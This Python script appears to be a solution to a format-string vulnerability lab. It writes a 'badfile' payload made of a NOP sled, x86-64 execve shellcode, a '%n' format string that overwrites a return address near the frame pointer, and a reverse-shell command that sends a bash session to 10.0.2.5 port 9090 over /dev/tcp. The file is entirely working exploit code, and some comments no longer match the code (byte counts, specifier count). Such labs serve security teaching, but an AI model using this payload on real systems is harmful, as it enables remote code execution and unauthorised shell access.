#!/usr/bin/python3
import sys

# The program takes the address of the buffer and the value
# of the frame pointer from the command line
buf_addr = int(sys.argv[1], 16)
frame_ptr = int(sys.argv[2], 16)

shellcode = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i > /dev/tcp/10.0.2.5/9090 0<&1 2>&1           *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Put the shellcode somewhere in the payload
start = len(content) - len(shellcode)               # Change this number
content[start:start + len(shellcode)] = shellcode

############################################################

# This line shows how to store a 4-byte integer at offset 0
number  = frame_ptr + 8
content[0:4]  =  (number).to_bytes(8,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
content[4:12]  =  ("AAAAAAAA").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%.8x "*264 + "%n"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt

############################################################

# Save the format string to file
with open('badfile', 'wb') as f:
  f.write(content)